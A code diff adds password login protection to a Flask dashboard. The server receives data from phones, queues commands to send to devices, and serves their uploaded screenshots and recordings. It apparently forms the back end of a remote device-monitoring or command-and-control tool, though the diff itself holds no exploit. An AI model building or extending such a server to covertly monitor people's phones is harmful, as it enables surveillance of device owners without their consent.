@@ -8,9 +8,12 @@ import json
 import base64
 import time
 from datetime import datetime
-from flask import Flask, request, jsonify, render_template, send_from_directory
+from functools import wraps
+from flask import Flask, request, jsonify, render_template, send_from_directory, session, redirect, url_for
 from flask_cors import CORS
 from database import init_db, insert_device, insert_batch, get_pending_commands, mark_command_done, add_command, query
+import config
+
 
 app = Flask(__name__)
 CORS(app)
@@ -18,6 +21,34 @@ app.secret_key = os.urandom(24)
 
 UPLOAD_DIR = os.path.join(os.path.dirname(__file__), 'data', 'uploads')
 os.makedirs(UPLOAD_DIR, exist_ok=True)
+
+# ============================================================
+#  AUTHENTICATION
+# ============================================================
+
+def login_required(f):
+    @wraps(f)
+    def decorated_function(*args, **kwargs):
+        if not session.get('authenticated'):
+            return redirect(url_for('login'))
+        return f(*args, **kwargs)
+    return decorated_function
+
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        password = request.form.get('password')
+        if password == config.DASHBOARD_PASSWORD:
+            session['authenticated'] = True
+            return redirect(url_for('dashboard'))
+        return render_template('login.html', error=True)
+    return render_template('login.html', error=False)
+
+@app.route('/logout')
+def logout():
+    session.pop('authenticated', None)
+    return redirect(url_for('login'))
+
 
 # ============================================================
 #  API ENDPOINTS (Phone → Server)
@@ -144,14 +175,18 @@ def command_result():
 
 @app.route('/')
 @app.route('/dashboard')
+@login_required
 def dashboard():
+
     """Main web dashboard."""
     devices = query('SELECT * FROM devices ORDER BY last_seen DESC')
     return render_template('dashboard.html', devices=devices)
 
 
 @app.route('/dashboard/device/<device_id>')
+@login_required
 def device_detail(device_id):
+
     """Device detail page with all tabs."""
     device = query('SELECT * FROM devices WHERE device_id = ?', (device_id,))
     if not device:
@@ -160,7 +195,9 @@ def device_detail(device_id):
 
 
 @app.route('/api/dashboard/<device_id>/<data_type>')
+@login_required
 def get_device_data(device_id, data_type):
+
     """AJAX endpoint for dashboard tabs."""
     limit = request.args.get('limit', 200, type=int)
     offset = request.args.get('offset', 0, type=int)
@@ -179,7 +216,9 @@ def get_device_data(device_id, data_type):
 
 
 @app.route('/api/dashboard/command', methods=['POST'])
+@login_required
 def issue_command():
+
     """Issue a command to a device from the dashboard."""
     payload = request.get_json(force=True)
     device_id = payload.get('device_id')
@@ -190,7 +229,9 @@ def issue_command():
 
 
 @app.route('/uploads/<device_id>/<filename>')
+@login_required
 def serve_upload(device_id, filename):
+
     """Serve uploaded files (screenshots, recordings)."""
     device_dir = os.path.join(UPLOAD_DIR, device_id)
     return send_from_directory(device_dir, filename)
